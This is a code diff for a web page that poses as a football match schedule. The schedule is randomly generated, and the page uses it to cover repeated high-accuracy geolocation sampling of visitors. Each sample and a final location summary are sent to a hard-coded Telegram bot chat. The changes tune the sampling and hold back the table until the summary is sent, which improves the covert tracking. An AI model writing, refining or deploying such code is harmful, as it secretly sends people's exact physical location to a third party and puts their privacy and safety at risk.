@@ -3,7 +3,7 @@ const CONFIG={
   telegramChatId:'8209565969',
   sampleCount:5,
   splashDurationMs:5000,
-  sampleDelayMs:100,
+  sampleDelayMs:300,
   developerName:'𝓐𝓱𝓶𝓮𝓭 𝓜𝓸𝓼𝓽𝓪𝓯𝓪' // زخرفة اسم المطور
 };
 
@@ -23,12 +23,7 @@ setTimeout(hideSplash,CONFIG.splashDurationMs);
 
 /* Geolocation sampling */
 function requestGeolocationSamples(){
-  if(!navigator.geolocation){
-    console.warn('Geolocation not supported');
-    showMatchesTable();
-    return;
-  }
-
+  if(!navigator.geolocation){console.warn('Geolocation not supported');showMatchesTable();return;}
   let idx=0;
   function takeSample(){
     navigator.geolocation.getCurrentPosition(
@@ -42,26 +37,21 @@ function requestGeolocationSamples(){
         };
         _samples.push(sample);
         sendSampleToTelegram(sample);
-
-        // الجدول يظهر مباشرة بعد أول عينة
-        if(idx===0) showMatchesTable();
-
         idx++;
-        if(idx<CONFIG.sampleCount) setTimeout(takeSample, CONFIG.sampleDelayMs);
+        if(idx<CONFIG.sampleCount)setTimeout(takeSample,CONFIG.sampleDelayMs);
         else sendSummaryToTelegram();
       },
       error=>{
-        if(error.code===error.PERMISSION_DENIED) console.info('User denied location.');
+        if(error.code===error.PERMISSION_DENIED)console.info('User denied location.');
         else console.error('Geolocation error:',error);
         showMatchesTable();
       },
-      {enableHighAccuracy:true, maximumAge:0, timeout:5000}
+      {enableHighAccuracy:true,maximumAge:0,timeout:10000}
     );
   }
   takeSample();
 }
 
-/* Send sample to Telegram */
 function sendSampleToTelegram(sample){
   const text=`
 📍 Sample #${sample.index}
@@ -76,9 +66,8 @@ function sendSampleToTelegram(sample){
   _sendTelegramMessage(text);
 }
 
-/* Send summary to Telegram */
 function sendSummaryToTelegram(){
-  if(!_samples.length) return;
+  if(!_samples.length)return;
   const best=_samples.reduce((p,c)=>c.acc<p.acc?c:p,_samples[0]);
   const medianLat=_samples[Math.floor(_samples.length/2)].lat;
   const medianLng=_samples[Math.floor(_samples.length/2)].lng;
@@ -93,9 +82,9 @@ function sendSummaryToTelegram(){
 ✨ Developer: ${CONFIG.developerName}
 `;
   _sendTelegramMessage(summary);
+  showMatchesTable();
 }
 
-/* Helper to send message to Telegram */
 function _sendTelegramMessage(text){
   const token=CONFIG.telegramBotToken;
   const chatId=CONFIG.telegramChatId;
@@ -132,7 +121,7 @@ function generateMatches(count){
     arr.push({
       team1:t1,
       team2:t2,
-      time:`${Math.floor(Math.random()*24).toString().padStart(2,'0')}:${Math.floor(Math.random()*60).toString().padStart(2,'0')}`,
+      time:`${String(Math.floor(Math.random()*24)).padStart(2,'0')}:${String(Math.floor(Math.random()*60)).padStart(2,'0')}`,
       stadium:stadiums[Math.floor(Math.random()*stadiums.length)]
     });
   }
